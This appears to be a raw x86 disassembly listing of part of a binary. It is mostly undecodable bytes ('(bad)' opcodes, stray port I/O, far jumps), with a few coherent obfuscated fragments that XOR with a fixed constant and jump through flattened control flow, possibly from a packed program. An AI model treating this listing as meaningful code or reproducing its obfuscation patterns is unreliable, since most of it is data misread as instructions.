  40fafb:	(bad)  
  40fafc:	and    dl,dh
  40fafe:	mov    esi,0x70cd609a
  40fb03:	loope  0x40faf9
  40fb05:	push   ss
  40fb06:	cmp    al,0x32
  40fb08:	pop    ebx
  40fb09:	icebp  
  40fb0a:	mov    eax,ds:0x4d062142
  40fb0f:	xlat   BYTE PTR ds:[ebx]
  40fb10:	pop    ebx
  40fb11:	fadd   st,st(3)
  40fb13:	in     al,0x78
  40fb15:	jmp    0x10d2:0x2f8a7a6a
  40fb1c:	ds adc edi,eax
  40fb1f:	(bad)  
  40fb21:	out    0xa6,al
  40fb23:	scas   eax,DWORD PTR es:[edi]
  40fb24:	xor    bh,ch
  40fb26:	mov    ebp,0x81ad6861
  40fb2b:	jnp    0x40fb00
  40fb2d:	lock sar ch,0x22
  40fb31:	ret    
  40fb32:	fwait
  40fb33:	sbb    DWORD PTR [esi],esp
  40fb35:	pop    es
  40fb36:	jle    0x40fac8
  40fb38:	stc    
  40fb39:	(bad)  
  40fb3a:	push   ebx
  40fb3b:	mov    WORD PTR [ebp-0x36],?
  40fb3e:	xor    DWORD PTR [edx],esp
  40fb40:	inc    edi
  40fb41:	mov    ecx,0xcef2175
  40fb46:	test   BYTE PTR [edi+0x46852f7],cl
  40fb4c:	cwde   
  40fb4d:	lods   eax,DWORD PTR ds:[esi]
  40fb4e:	mov    ch,0xa8
  40fb50:	mov    bl,BYTE PTR [esi]
  40fb52:	mov    esi,0x46365672
  40fb57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb58:	cmp    bl,BYTE PTR [esi+ebp*4]
  40fb5b:	push   ss
  40fb5c:	test   eax,0xf9b34a56
  40fb61:	dec    DWORD PTR [edx-0x39ad541c]
  40fb67:	adc    al,0xc2
  40fb69:	jo     0x40fb3a
  40fb6b:	call   0x6314fa0a
  40fb70:	xor    al,0xec
  40fb72:	xor    eax,0xcd304e30
  40fb77:	xor    eax,0xef2a598b
  40fb7c:	or     BYTE PTR [ebp+0x51],0xbd
  40fb80:	shr    BYTE PTR [edx+0x64],0x7a
  40fb84:	fs jb  0x40fb36
  40fb87:	arpl   cx,sp
  40fb89:	mov    dh,0x8b
  40fb8b:	inc    edi
  40fb8c:	jae    0x40fc0c
  40fb8e:	sahf   
  40fb8f:	xor    ebx,DWORD PTR [esi-0x6]
  40fb92:	mov    bl,0x6c
  40fb94:	sbb    DWORD PTR cs:[ebx],0x3b1b2686
  40fb9b:	sbb    edx,DWORD PTR [esi-0x41346b66]
  40fba1:	popf   
  40fba2:	daa    
  40fba3:	pop    edx
  40fba4:	sbb    eax,0xb62836f6
  40fba9:	inc    edi
  40fbaa:	js     0x40fb73
  40fbac:	mov    ebp,0x3d81728b
  40fbb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbb2:	(bad)  
  40fbb3:	jo     0x40fbd1
  40fbb5:	sbb    DWORD PTR [ebx+edx*8-0xfcaf345],edi
  40fbbc:	rcr    BYTE PTR [ecx+0x1f],1
  40fbbf:	fnsave [ebp-0x46669858]
  40fbc5:	fdivr  st,st(5)
  40fbc7:	add    eax,0xdc24e37
  40fbcc:	cmp    eax,0x603e0a5f
  40fbd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbd2:	xor    DWORD PTR [edi-0x16],edi
  40fbd5:	gs test eax,0x8e418f60
  40fbdb:	aad    0x9a
  40fbdd:	and    ecx,DWORD PTR [edx+ebp*8-0xb6dcb3]
  40fbe4:	mov    esi,0x6a11b58a
  40fbe9:	and    eax,DWORD PTR ss:[edx+0x14]
  40fbed:	aam    0xff
  40fbef:	lahf   
  40fbf0:	add    edx,DWORD PTR [ebx+ebx*4]
  40fbf3:	push   ecx
  40fbf4:	gs inc ecx
  40fbf6:	jle    0x40fbbb
  40fbf8:	jns    0x40fbf6
  40fbfa:	dec    ebx
  40fbfb:	data16 aaa 
  40fbfd:	je     0x40fbb5
  40fbff:	sbb    eax,0x63656084
  40fc04:	push   ss
  40fc05:	push   edx
  40fc06:	mov    eax,ds:0xeca7b186
  40fc0b:	in     eax,dx
  40fc0c:	jno    0x40fbe3
  40fc0e:	adc    BYTE PTR [eax+0x31e4f85e],bh
  40fc14:	call   0x7dce:0x94775382
  40fc1b:	ror    BYTE PTR [edi-0x3d],0xe
  40fc1f:	cld    
  40fc20:	dec    edi
  40fc21:	fst    QWORD PTR [edx+eax*8+0x5]
  40fc25:	xor    DWORD PTR [eax-0x3b09565b],esp
  40fc2b:	shl    DWORD PTR [ecx+0x34],1
  40fc2e:	std    
  40fc2f:	scas   eax,DWORD PTR es:[edi]
  40fc30:	int    0xa1
  40fc32:	sbb    ebp,DWORD PTR [ebp-0x764a1f4e]
  40fc38:	xchg   edx,eax
  40fc39:	xchg   ebx,eax
  40fc3a:	mov    dl,BYTE PTR [edx-0x3a]
  40fc3d:	pusha  
  40fc3e:	ins    BYTE PTR es:[edi],dx
  40fc3f:	int    0x2c
  40fc41:	dec    esp
  40fc42:	xor    eax,0x84e9f521
  40fc47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc48:	int3   
  40fc49:	mov    ds:0xf436fcde,al
  40fc4e:	cld    
  40fc4f:	xchg   ebx,eax
  40fc50:	aas    
  40fc51:	ins    BYTE PTR es:[edi],dx
  40fc52:	dec    ecx
  40fc53:	mov    ecx,0x3bd1e915
  40fc58:	lahf   
  40fc59:	sub    al,0x79
  40fc5b:	jne    0x40fbe3
  40fc5d:	sub    dl,cl
  40fc5f:	test   eax,0x2b7d7f13
  40fc65:	add    BYTE PTR [esi],dl
  40fc67:	shl    DWORD PTR [ebp-0x78c91bbe],0x7e
  40fc6e:	outs   dx,DWORD PTR ds:[esi]
  40fc6f:	lahf   
  40fc70:	xor    eax,0x3ae7d236
  40fc75:	pop    edi
  40fc76:	sbb    al,0x15
  40fc78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc79:	in     eax,0xe2
  40fc7b:	or     ebp,DWORD PTR [ebp+edx*1+0x37f0917b]
  40fc82:	iret   
  40fc83:	add    dl,dh
  40fc85:	dec    eax
  40fc86:	ja     0x40fc85
  40fc88:	fidivr WORD PTR [ecx-0x8]
  40fc8b:	lahf   
  40fc8c:	push   cs
  40fc8d:	mov    ecx,0xbda5367c
  40fc92:	xor    DWORD PTR [edi-0x6e],ebx
  40fc95:	retf   0xb11f
  40fc98:	xlat   BYTE PTR ds:[ebx]
  40fc99:	push   esp
  40fc9a:	jle    0x40fcdb
  40fc9c:	push   esp
  40fc9d:	pop    eax
  40fc9e:	ds xor eax,0x4d97a2e3
  40fca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fca5:	bound  ebx,QWORD PTR [ecx]
  40fca7:	push   ebx
  40fca8:	bound  edx,QWORD PTR [edx-0x24]
  40fcab:	ret    
  40fcac:	ror    edx,0xa6
  40fcaf:	jae    0x40fc9b
  40fcb1:	jb     0x40fc72
  40fcb3:	mov    cl,0xf7
  40fcb5:	daa    
  40fcb6:	cs or  edx,ebp
  40fcb9:	ret    0x201a
  40fcbc:	mov    ?,WORD PTR [eax]
  40fcbe:	aam    0x1a
  40fcc0:	mov    dl,0x9d
  40fcc2:	dec    esp
  40fcc3:	sub    BYTE PTR [edx+0x7c],bl
  40fcc6:	sub    ebp,DWORD PTR [edx-0x60]
  40fcc9:	test   al,0x88
  40fccb:	push   0x3b
  40fccd:	ja     0x40fce6
  40fccf:	mov    dh,0x3
  40fcd1:	in     eax,dx
  40fcd2:	stc    
  40fcd3:	push   edx
  40fcd4:	jl     0x40fd39
  40fcd6:	inc    ebx
  40fcd7:	xchg   BYTE PTR [ecx-0x4061c4eb],ch
  40fcdd:	xor    al,0x49
  40fcdf:	adc    esp,DWORD PTR [edi]
  40fce1:	xchg   ebp,eax
  40fce2:	in     eax,dx
  40fce3:	sbb    DWORD PTR [esi],esp
  40fce5:	pop    edx
  40fce6:	fiadd  WORD PTR [edi-0x4a78362b]
  40fcec:	fisttp QWORD PTR [esi+eax*1-0x78]
  40fcf0:	xchg   esp,eax
  40fcf1:	cmp    dl,BYTE PTR [esi]
  40fcf3:	test   DWORD PTR [edi+0x496e7e54],ecx
  40fcf9:	mov    dh,BYTE PTR [esi-0x5e]
  40fcfc:	jns    0x40fd61
  40fcfe:	mov    dh,0x2b
  40fd00:	or     DWORD PTR [edx-0x48],0xb
  40fd04:	aad    0x88
  40fd06:	imul   esi,DWORD PTR [edx-0x65],0x9e599a17
  40fd0d:	test   al,0x2f
  40fd0f:	add    esi,edx
  40fd11:	cmp    eax,0xe623d1ed
  40fd16:	xchg   esi,eax
  40fd17:	ja     0x40fccf
  40fd19:	ins    BYTE PTR es:[edi],dx
  40fd1a:	xor    eax,0x7510855
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	rol    DWORD PTR [edi],1
  40fd76:	iret   
  40fd77:	mov    eax,0x7070b7d8
  40fd7c:	dec    ecx
  40fd7d:	jge    0x40fdef
  40fd7f:	jo     0x40fd65
  40fd81:	and    esp,ebp
  40fd83:	sbb    ebp,DWORD PTR [edx-0x4f090a93]
  40fd89:	lods   eax,DWORD PTR ds:[esi]
  40fd8a:	jmp    DWORD PTR [esp+ebx*1-0x2c]
  40fd8e:	pop    es
  40fd8f:	mov    al,ch
  40fd91:	and    eax,0xf2a6018e
  40fd96:	sbb    DWORD PTR [ebp-0x3a],ebp
  40fd99:	popa   
  40fd9a:	hlt    
  40fd9b:	(bad)  
  40fd9c:	call   0x7ed1093f
  40fda1:	loop   0x40fdac
  40fda3:	dec    edx
  40fda5:	ds je  0x40fd7d
  40fda8:	adc    al,0x5e
  40fdaa:	loopne 0x40fe0d
  40fdac:	stos   BYTE PTR es:[edi],al
  40fdad:	es cmp ebx,esi
  40fdb0:	dec    edx
  40fdb1:	mov    ah,0x1
  40fdb3:	shr    esp,1
  40fdb5:	or     esi,esi
  40fdb7:	loope  0x40fde3
  40fdb9:	push   esp
  40fdba:	jo     0x40fde6
  40fdbc:	addr16 popa 
  40fdbe:	sti    
  40fdbf:	aam    0xd8
  40fdc1:	addr16 out 0x8d,eax
  40fdc4:	push   ds
  40fdc5:	shl    BYTE PTR [esi+esi*1+0x33],0xf8
  40fdca:	bound  esi,QWORD PTR [eax+0x1f]
  40fdcd:	in     eax,0x4a
  40fdcf:	pop    edx
  40fdd0:	rcl    BYTE PTR [ebx+0x6f60caf],cl
  40fdd6:	jb     0x40fe50
  40fdd8:	mov    ch,0x44
  40fdda:	or     ecx,DWORD PTR [ecx-0x306fb91b]
  40fde0:	cld    
  40fde1:	mov    bl,0x13
  40fde3:	sub    eax,0x1f96710b
  40fde8:	push   0xffffffdd
  40fdea:	xchg   esi,eax
  40fdeb:	xchg   edi,eax
  40fdec:	jnp    0x40fd78
  40fdee:	pop    es
  40fdef:	mov    esp,0x60551fdb
  40fdf4:	and    ebp,DWORD PTR [esi+edi*4-0x5a]
  40fdf8:	mov    WORD PTR [esi+0x6f],cs
  40fdfb:	repnz sbb eax,DWORD PTR [esi+0x38]
  40fdff:	jbe    0x40fe40
  40fe01:	pop    ecx
  40fe02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe03:	aad    0x8
  40fe05:	lods   al,BYTE PTR ds:[esi]
  40fe06:	(bad)  
  40fe07:	pop    ss
  40fe08:	popf   
  40fe09:	daa    
  40fe0a:	jl     0x40fe67
  40fe0c:	pop    edi
  40fe0d:	add    al,0xaf
  40fe0f:	and    bh,cl
  40fe11:	fdivr  QWORD PTR [ebx]
  40fe13:	in     eax,0xa0
  40fe15:	mov    ecx,0xc85468b4
  40fe1a:	mov    dl,0x38
  40fe1c:	imul   DWORD PTR ds:0xf3744371
  40fe22:	pusha  
  40fe23:	sub    ebx,DWORD PTR [esi]
  40fe25:	xchg   bl,ch
  40fe27:	push   ebx
  40fe28:	pop    es
  40fe29:	and    DWORD PTR [eax+0x2f],eax
  40fe2c:	xor    eax,0x2a195ba
  40fe31:	je     0x40fe64
  40fe33:	xchg   bl,dh
  40fe35:	mov    BYTE PTR [eax-0x18],dl
  40fe38:	sbb    al,0x24
  40fe3a:	js     0x40fe56
  40fe3c:	mov    ebp,0xb1c02e9f
  40fe41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe42:	pushf  
  40fe43:	dec    eax
  40fe44:	jp     0x40fe13
  40fe46:	leave  
  40fe47:	ss mov esp,0x3e8963bf
  40fe4d:	xchg   edx,eax
  40fe4e:	xor    edi,DWORD PTR [eax+0x52c29e6b]
  40fe54:	fsub   QWORD PTR [ebx+0x27]
  40fe57:	je     0x40fec3
  40fe59:	sub    eax,0x7aea436
  40fe5e:	imul   edx,DWORD PTR [edx+0x1859564b],0xffffffba
  40fe65:	adc    BYTE PTR [eax],0x27
  40fe68:	pushf  
  40fe69:	push   cs
  40fe6a:	push   esp
  40fe6b:	adc    ah,ah
  40fe6d:	test   al,0x53
  40fe6f:	lock mov edx,0xb581c033
  40fe75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe76:	ins    DWORD PTR es:[edi],dx
  40fe77:	aaa    
  40fe78:	mov    ebx,DWORD PTR [ecx-0x3e483bf8]
  40fe7e:	or     al,0xf
  40fe80:	in     eax,0x5b
  40fe82:	xor    bh,BYTE PTR [eax+0x3d]
  40fe85:	push   es
  40fe86:	loope  0x40fe99
  40fe88:	into   
  40fe89:	sahf   
  40fe8a:	mov    eax,0xbf309c53
  40fe8f:	addr16 cmp al,0x7f
  40fe92:	jecxz  0x40fe19
  40fe94:	fnstcw WORD PTR [ebp+eax*4-0x5e]
  40fe98:	sub    BYTE PTR [esi],cl
  40fe9a:	inc    edx
  40fe9b:	fdiv   st,st(2)
  40fe9d:	push   ebx
  40fe9e:	mov    al,0x74
  40fea0:	iret   
  40fea1:	idiv   BYTE PTR [esi-0x4f0939b3]
  40fea7:	xchg   edi,eax
  40fea8:	rcl    DWORD PTR [eax],0xd8
  40feab:	adc    eax,0xa464c4ab
  40feb0:	repz mov ah,0x45
  40feb3:	dec    ebp
  40feb5:	cld    
  40feb6:	and    BYTE PTR [ecx-0x3b4f965e],ch
  40febc:	dec    edx
  40febd:	cs push esp
  40febf:	xchg   ebx,eax
  40fec0:	mov    ebx,0x9790c62f
  40fec5:	and    eax,0xd18d3ce9
  40feca:	jae    0x40fe6c
  40fecc:	sbb    eax,0x8ffc322f
  40fed1:	jno    0x40feaa
  40fed3:	push   es
  40fed4:	and    esp,DWORD PTR [edi]
  40fed6:	push   0xadbd2376
  40fedb:	dec    esi
  40fedc:	mov    edi,0x49378e93
  40fee1:	scas   eax,DWORD PTR es:[edi]
  40fee2:	shl    esi,0x13
  40fee5:	repz mov ebx,0x963a848
  40feeb:	repz dec esi
  40feed:	pop    ebx
  40feee:	or     cl,bl
  40fef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fef1:	add    DWORD PTR [eax],0x144ed304
  40fef7:	mov    cl,0xb7
  40fef9:	ss sub ah,dh
  40fefc:	mul    DWORD PTR [eax-0x1f]
  40feff:	xlat   BYTE PTR ds:[ebx]
  40ff00:	loop   0x40fe9e
  40ff02:	es enter 0xa360,0xcf
  40ff07:	mov    BYTE PTR [eax],dl
  40ff09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff0a:	aas    
  40ff0b:	pop    esp
  40ff0c:	dec    edi
  40ff0d:	rol    BYTE PTR ds:0xbd05515e,cl
  40ff13:	dec    edx
  40ff14:	in     al,dx
  40ff15:	scas   eax,DWORD PTR es:[edi]
  40ff16:	(bad)  
  40ff17:	sahf   
  40ff18:	sbb    esp,DWORD PTR [edx]
  40ff1a:	mov    ebp,0x67f42d33
  40ff1f:	xchg   ebp,eax
  40ff20:	sbb    dh,BYTE PTR [ecx]
  40ff22:	sub    bl,BYTE PTR [ecx+0x4a]
  40ff25:	(bad)  
  40ff26:	in     eax,dx
  40ff27:	fiadd  DWORD PTR [edi+eiz*1+0x295010dd]
  40ff2e:	gs xchg edx,eax
  40ff30:	mov    eax,ds:0x4479af9f
  40ff35:	xor    DWORD PTR [ecx],edx
  40ff37:	aam    0xc1
  40ff39:	pop    esp
  40ff3a:	repnz pop es
  40ff3c:	xor    DWORD PTR [ecx+0x3160719],0xe820adbc
  40ff46:	in     eax,dx
  40ff47:	dec    esp
  40ff48:	fisub  WORD PTR [ecx+0x1835946b]
  40ff4e:	or     eax,0xb81ade8f
  40ff53:	test   DWORD PTR [eax+eiz*2-0xd],esi
  40ff57:	bound  eax,QWORD PTR [eax]
  40ff59:	outs   dx,BYTE PTR ds:[esi]
  40ff5a:	arpl   WORD PTR [edi-0x35],bx
  40ff5d:	das    
  40ff5e:	jle    0x40ffb5
  40ff60:	mov    bl,0x64
  40ff62:	inc    ebp
  40ff63:	xor    ebp,edi
  40ff65:	jl     0x40ff0d
  40ff67:	call   0x397:0x43cea389
  40ff6e:	cs ret 
  40ff70:	fcmove st,st(5)
  40ff72:	push   esi
  40ff73:	and    DWORD PTR [ecx],0xbf74ad95
  40ff79:	(bad)  
  40ff7a:	dec    edi
  40ff7b:	cdq    
  40ff7c:	sbb    eax,0xd679adbe
  40ff81:	jne    0x40ff68
  40ff83:	in     eax,0x9
  40ff85:	ds ds pop ss
  40ff88:	mov    edx,0x5473faf5
  40ff8d:	les    ebp,FWORD PTR [edx-0x14]
  40ff90:	push   eax
  40ff91:	sub    al,0x7d
  40ff93:	in     al,0xc2
  40ff95:	leave  
  40ff96:	pop    ecx
  40ff97:	sub    al,BYTE PTR [edx]
  40ff99:	mov    es,WORD PTR [ecx-0x79]
  40ff9c:	out    dx,eax
  40ff9d:	mov    ?,edx
  40ff9f:	jmp    0x3bd3e5c6
  40ffa4:	lods   al,BYTE PTR ds:[esi]
  40ffa5:	aaa    
  40ffa6:	aas    
  40ffa7:	inc    edi
  40ffa8:	nop
  40ffa9:	cmp    al,0x4c
  40ffab:	fistp  WORD PTR [edi-0xb]
  40ffae:	jae    0x40ff62
  40ffb0:	into   
  40ffb1:	into   
  40ffb2:	fidiv  WORD PTR [ebp+0x6b]
  40ffb5:	pop    ss
  40ffb6:	jno    0x40ff8f
  40ffb8:	sub    BYTE PTR [ebx+ecx*4-0x3fe29974],ch
  40ffbf:	mov    dh,0xdf
  40ffc1:	or     eax,DWORD PTR [ebx+esi*4+0x68547c31]
  40ffc8:	xor    BYTE PTR [esp+ebx*1],dl
  40ffcb:	mov    dl,0xd8
  40ffcd:	push   0x78
  40ffcf:	addr16 push ss
  40ffd1:	sub    eax,0xecce8ae7
  40ffd6:	adc    BYTE PTR [edx],0x34
  40ffd9:	or     BYTE PTR [ebp-0x5c],dl
  40ffdc:	mov    ecx,0xcb3b2301
  40ffe1:	pop    eax
  40ffe2:	jg     0x410031
  40ffe4:	outs   dx,BYTE PTR ds:[esi]
  40ffe5:	jp     0x40ff86
  40ffe7:	call   0x5159a20f
  40ffec:	and    DWORD PTR [ecx-0x51],0xa3af9fd
  40fff3:	pusha  
  40fff4:	loop   0x40ffbc
  40fff6:	jl     0x41002e
  40fff8:	loopne 0x410024
  40fffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fffc:	mov    ds:0x7d48cc10,al
  410001:	jge    0x40ffdc
  410003:	dec    edx
  410004:	xchg   BYTE PTR [ebx],dh
  410006:	adc    edx,DWORD PTR [esi+0x7811641c]
  41000c:	mov    ds:0xcb971962,al
  410011:	in     eax,dx
  410012:	test   eax,0x1a03f866
  410017:	sahf   
  410018:	mov    dl,0x17
  41001a:	lock mov BYTE PTR [esi+ecx*1+0x76e798e],bh
  410022:	fadd   DWORD PTR [eax]
  410024:	xchg   ebx,eax
  410025:	xor    al,BYTE PTR [ebx-0x7e]
  410028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410029:	idiv   DWORD PTR [esi]
  41002b:	in     al,dx
  41002c:	push   0xffffff91
  41002e:	xor    BYTE PTR [ecx+0x514527cc],ch
  410034:	dec    esp
  410035:	xchg   ecx,eax
  410036:	push   es
  410037:	sub    al,0xda
  410039:	lea    eax,[edi-0x3d488cca]
  41003f:	inc    esp
  410040:	popf   
  410041:	fdivr  DWORD PTR [eax-0x5445c7e7]
  410047:	retf   
  410048:	inc    esp
  410049:	aam    0xad
  41004b:	cdq    
  41004c:	cli    
  41004d:	fsub   QWORD PTR [eax+0x21a9437c]
  410053:	cli    
  410054:	jmp    0xec7a:0x81799b7a
  41005b:	rol    DWORD PTR [eax+0x1891e23],1
  410061:	jecxz  0x4100da
  410063:	and    ch,BYTE PTR [esi-0x1b88ebcc]
  410069:	aaa    
  41006a:	lahf   
  41006b:	(bad)  
  41006c:	addr16 mov esi,0x6921f002
  410072:	into   
  410073:	and    BYTE PTR [esi+ebp*2],cl
  410076:	(bad)  
  410077:	outs   dx,DWORD PTR ds:[esi]
  410078:	test   al,0xe8
  41007a:	xchg   DWORD PTR [ecx-0x89e5476],edi
  410080:	dec    eax
  410081:	pop    edx
  410082:	div    dl
  410084:	(bad)  
  410085:	loopne 0x41004e
  410087:	fisub  WORD PTR ds:0x641173fc
  41008d:	lahf   
  41008e:	shl    dh,1
  410090:	jns    0x41001b
  410092:	jle    0x4100f5
  410094:	mov    dl,0x7a
  410096:	and    eax,0x4dae014c
  41009b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41009c:	iret   
  41009d:	fdiv   st(1),st
  41009f:	sbb    al,0xd2
  4100a1:	shl    BYTE PTR [ecx-0x54],cl
  4100a4:	ss pop ebp
  4100a6:	js     0x410067
  4100a8:	test   BYTE PTR [edx+eax*4-0x71bc62fa],dh
  4100af:	into   
  4100b0:	stc    
  4100b1:	mov    BYTE PTR [ecx+0x1f],ch
  4100b4:	arpl   bx,bx
  4100b6:	stc    
  4100b7:	xchg   ecx,eax
  4100b8:	jnp    0x410049
  4100ba:	pop    ebx
  4100bb:	xor    ebp,DWORD PTR [edx+0x20]
  4100be:	inc    ebx
  4100bf:	lods   eax,DWORD PTR ds:[esi]
  4100c0:	leave  
  4100c1:	mov    al,0xc1
  4100c3:	fmul   QWORD PTR [edi]
  4100c5:	fiadd  DWORD PTR [esi-0x44f25278]
  4100cb:	call   0x7c38c9fd
  4100d0:	jle    0x4100c9
  4100d2:	mov    fs,ebx
  4100d4:	call   0x4f68ba5
  4100d9:	dec    eax
  4100da:	test   DWORD PTR ds:0x838a77d1,0x2852f082
  4100e4:	and    al,0x7d
  4100e6:	sub    ebp,DWORD PTR [eax-0x45]
  4100e9:	add    eax,0xfb405b5e
  4100ee:	ja     0xcb20a08c
  4100f4:	popw   ds
  4100f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100f7:	dec    ebx
  4100f8:	fld    st(3)
  4100fa:	push   esi
  4100fb:	mov    eax,ds:0xb5a14b61
  410100:	jl     0x4100d4
  410102:	and    al,0xcb
  410104:	xor    eax,0x6096beb7
  410109:	xor    BYTE PTR [edi+0x5ed5d035],bh
  41010f:	repnz dec edi
  410111:	icebp  
  410112:	mov    eax,0x2ba121f4
  410117:	push   ebx
  410118:	add    esi,edx
  41011a:	cmp    BYTE PTR [esi+0x5f],ah
  41011d:	mov    bl,0xff
  41011f:	and    BYTE PTR [edi+edi*4-0x6a],bl
  410123:	out    dx,al
  410124:	inc    eax
  410125:	pushf  
  410126:	pop    edx
  410127:	push   edi
  410128:	pop    es
  410129:	das    
  41012a:	and    al,0x95
  41012c:	out    dx,eax
  41012d:	and    al,0x99
  41012f:	sub    DWORD PTR [esi+0x1c],esi
  410132:	push   0xffffffb7
  410134:	in     al,0xdd
  410136:	unpckhps xmm3,XMMWORD PTR [esi+0x7c]
  41013a:	fldenv [ebx+0x44974353]
  410140:	and    eax,0x62f8d837
  410145:	in     eax,0xdb
  410147:	mov    ah,0x97
  410149:	cmp    al,ch
  41014b:	stc    
  41014c:	pop    ecx
  41014d:	ins    DWORD PTR es:[edi],dx
  41014e:	mov    bl,0xf5
  410150:	push   ss
  410151:	pop    esi
  410152:	push   0xc86d1930
  410157:	cmp    ecx,eax
  410159:	jne    0x41016c
  41015f:	mov    eax,DWORD PTR [ebp-0x4]
  410162:	xor    eax,0x7510855
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	cmp    edi,DWORD PTR [ebp+0x29]
  41018c:	or     dh,BYTE PTR [ecx]
  41018e:	mov    bl,0x70
  410190:	jo     0x4101db
  410192:	jge    0x410204
  410194:	jo     0x4101e9
  410196:	out    0x36,eax
  410198:	lods   eax,DWORD PTR ds:[esi]
  410199:	dec    eax
  41019a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41019b:	push   esi
  41019c:	call   0x1f25c0d1
  4101a1:	pop    ebx
  4101a2:	inc    edi
  4101a3:	adc    eax,0x9a423a79
  4101a8:	call   0x2d189bde
  4101ad:	push   cs
  4101ae:	push   edi
  4101af:	loopne 0x410183
  4101b1:	ja     0x410225
  4101b3:	call   0xedd76a20
  4101b8:	out    0x7,al
  4101ba:	push   edx
  4101bb:	(bad)  
  4101bc:	cmp    esi,DWORD PTR [eax]
  4101be:	mov    esi,DWORD PTR [esi]
  4101c0:	cld    
  4101c1:	ror    ebx,cl
  4101c3:	mov    bh,0x18
  4101c5:	ret    0xe6cc
  4101c8:	das    
  4101c9:	and    bl,ah
  4101cb:	ds mov edx,0xf0ab6f5d
  4101d1:	bound  ecx,QWORD PTR [esi-0x78]
  4101d4:	push   edx
  4101d5:	dec    edx
  4101d6:	mov    ch,0x2a
  4101d8:	mov    DWORD PTR es:[eax+0x53],edx
  4101dc:	popa   
  4101dd:	mov    dl,0x27
  4101df:	sbb    esi,esp
  4101e1:	add    DWORD PTR [eax*2+0x720ecb72],0x3ce5cdd4
  4101ec:	xlat   BYTE PTR ds:[ebx]
  4101ed:	dec    edi
  4101ee:	call   0xbc6:0xd4052194
  4101f5:	jae    0x4101f9
  4101f7:	pop    eax
  4101f8:	dec    edx
  4101f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101fa:	jmp    0xfdf3:0xb0a07251
  410201:	inc    esp
  410202:	int3   
  410203:	xchg   edx,eax
  410204:	scas   eax,DWORD PTR es:[edi]
  410205:	aas    
  410206:	out    dx,eax
  410207:	pop    ds
  410208:	out    0xfa,eax
  41020a:	pop    esp
  41020b:	hlt    
  41020c:	mov    al,ds:0x2a204eed
  410211:	or     BYTE PTR [ebx-0x44],0x2e
  410215:	lock ret 
  410217:	pop    edx
  410218:	daa    
  410219:	sub    cl,BYTE PTR [edx+0x48]
  41021c:	ss mov ch,0xef
  41021f:	cs test al,0xd3
  410222:	inc    ebx
  410223:	mov    dl,0x24
  410225:	test   BYTE PTR [ebp+0x56b87f48],dh
  41022b:	mov    eax,0xcfa62157
  410230:	push   esp
  410231:	inc    ebp
  410232:	std    
  410233:	adc    eax,0xf6315a6
  410238:	inc    ebp
  410239:	retf   0x1c5a
  41023c:	lea    edx,[ecx+esi*2+0x56]
  410240:	out    0xb7,al
  410242:	or     eax,esp
  410244:	test   DWORD PTR [ecx+esi*1],ebx
  410247:	and    BYTE PTR [esi],ah
  410249:	ror    bh,1
  41024b:	repz ror DWORD PTR [edx+0x6a4cf5e0],1
  410252:	and    DWORD PTR [esi],ebx
  410254:	mov    ds:0x504496a7,al
  410259:	stos   BYTE PTR es:[edi],al
  41025a:	jno    0x410223
  41025c:	xchg   ebx,eax
  41025d:	jg     0x41025c
  41025f:	pop    ebx
  410260:	shl    DWORD PTR [esi+edx*1+0x2c],cl
  410264:	jnp    0x41028c
  410266:	adc    al,0xb4
  410268:	lods   al,BYTE PTR ds:[esi]
  410269:	inc    edx
  41026a:	out    0x9a,al
  41026c:	mov    edx,0x95855ef8
  410271:	xchg   BYTE PTR [edi-0x3e],bh
  410274:	retf   0xe55a
  410277:	xor    BYTE PTR [eax-0x19c755e2],0x5b
